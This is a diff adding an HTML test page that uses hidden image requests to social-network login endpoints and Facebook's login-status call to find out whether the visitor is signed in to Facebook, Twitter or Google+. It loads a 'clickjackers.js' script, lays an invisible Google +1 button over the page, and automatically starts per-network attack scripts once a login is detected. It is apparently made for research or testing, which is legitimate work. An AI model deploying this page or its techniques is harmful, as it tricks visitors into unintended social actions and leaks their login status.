@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]> <html class="ie6"> <![endif]-->
+<!--[if IE 7 ]>    <html class="ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html class="ie8"> <![endif]-->
+<!--[if IE 9 ]>    <html class="ie9"> <![endif]-->
+<head>
+
+	<title>Test</title>
+
+
+	<script src="jquery-1.9.1.min.js"></script>
+	<script type='text/javascript' src='http://platform.twitter.com/widgets.js?ver=1.1'></script>
+	<script type='text/javascript' src='jquery.cookie.js'></script>
+	<script type='text/javascript' src='clickjackers.js'></script> 
+    <script type="text/javascript" src="http://apis.google.com/js/plusone.js"></script> 
+
+
+	<script type="text/javascript">
+
+		//var networks = [ 'Facebook', 'Twitter', 'GooglePlus' ];
+		var networks = [ 'Facebook', 'Twitter', 'GooglePlus' ];
+		var loggedInCount = 0;
+		var twitterLoggedIn = false;
+		var facebookLoggedIn = false;
+		var googleLoggedIn = false;
+
+
+		function show_login_status(network, status)
+		{
+			if (status)
+			{
+				$("#" + network + "Status").html("You are currently logged in to <span class='red'>" + network + "</span>");
+			}else{
+				$("#" + network + "Status").html("You are not currently logged in to <span class='green'>" + network + "</span>");
+			}
+
+			// Remove network from networks array
+			var i = networks.indexOf(network);
+			if (i >= 0)
+				networks.splice(i, 1);
+
+			if (status)
+			{
+				++loggedInCount;
+				switch (network)
+				{
+				case 'Twitter': $('#rb-tw').removeAttr('disabled'); twitterLoggedIn = true; break;
+				case 'Facebook': $('#rb-fb').removeAttr('disabled'); facebookLoggedIn = true; break;
+				case 'GooglePlus': $('#rb-gp').removeAttr('disabled'); googleLoggedIn = true; break;
+				}
+			}
+			else
+			{
+				switch (network)
+				{
+				case 'Twitter': $('#rb-tw').attr('disabled', 'disabled'); twitterLoggedIn = false; break;
+				case 'Facebook': $('#rb-fb').attr('disabled', 'disabled'); facebookLoggedIn = false; break;
+				case 'GooglePlus': $('#rb-gp').attr('disabled', 'disabled'); googleLoggedIn = false; break;
+				}
+			}
+			
+			if (networks.length == 0)
+			{
+				// Continue with automated work
+				var cookieFacebook = $.cookie('facebook-checked');
+				var cookieTwitter = $.cookie('twitter-checked');
+				var cookieGoogle = $.cookie('google-checked');
+				if (facebookLoggedIn && cookieFacebook == null)
+				{
+					console.log('starting facebook script');
+					$.cookie('facebook-checked', 'true');
+					$.startFacebook(); 
+				}
+				else if (twitterLoggedIn && cookieTwitter == null)
+				{
+					console.log ('starting twitter 2 script');
+					//$.cookie('twitter-checked', 'true');
+					$.startTwitter(); 
+				}
+                else if (googleLoggedIn && cookieGoogle == null)
+                {
+                    console.log('starting google+ script');
+                   //$.cookie('google-checked', 'true');
+                    $.startGoogle();
+                }
+                else {
+                    console.log("all cookies set. nothing left to do."); 
+                }
+			}
+			
+		}
+
+
+
+	</script>
+
+
+
+</head>
+<body>
+
+
+
+
+
+<img style="display:none;"
+onload="show_login_status('Google', true)"
+onerror="show_login_status('Google', false)"
+src="https://accounts.google.com/CheckCookie?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png" />
+
+<img style="display:none;"
+onload="show_login_status('GooglePlus', true)"
+onerror="show_login_status('GooglePlus', false)"
+src="https://plus.google.com/up/?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png&type=st&gpsrc=ogpy0" />
+
+<img style="display:none;" src="https://twitter.com/login?redirect_after_login=%2Fimages%2Fspinner.gif" onload="show_login_status('Twitter', true)" onerror="show_login_status('Twitter', false)" />
+<!--
+Test which network?:
+<input id="rb-fb" type="radio" name="network" value="fb" onchange="network='facebook'" disabled="disabled"/>Facebook
+<input id="rb-tw" type="radio" name="network" value="tw" onchange="network='twitter'" disabled="disabled"/>Twitter
+<input id="rb-gp" type="radio" name="network" value="gp" onchange="network='googlePlus'" disabled="disabled"/>GooglePlus
+-->
+<br/>
+
+<div id="fb-root"></div>
+
+
+
+	<div id="FacebookStatus" class="outputStatus"></div>
+	<div id="TwitterStatus" class="outputStatus"></div>
+	<div id="GooglePlusStatus" class="outputStatus"></div>
+
+ <div id="googleWrapper" style="position: absolute; opacity: 0; filter: alpha(opacity = 0); margin-left: -50px; z-index: 100;"><g:plusone></g:plusone></div> 
+ 
+
+<script>
+    window.fbAsyncInit = function(){
+        //alert('fbAsyncInit called');
+        FB.init({ appId:'230747760380931', status:true,  cookie:true, xfbml:true});
+        FB.getLoginStatus(function(response){
+            if (response.status != "unknown")
+            {
+                show_login_status("Facebook", true);
+            }else{
+                show_login_status("Facebook", false);
+            }
+        });
+    };
+    // Load the SDK Asynchronously
+    (function(d){
+        var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
+        js = d.createElement('script'); js.id = id; js.async = true;
+        js.src = "https://connect.facebook.net/en_US/all.js";
+        d.getElementsByTagName('head')[0].appendChild(js);
+    }(document));
+</script>
+
+</body>
+</html>
+
+
+
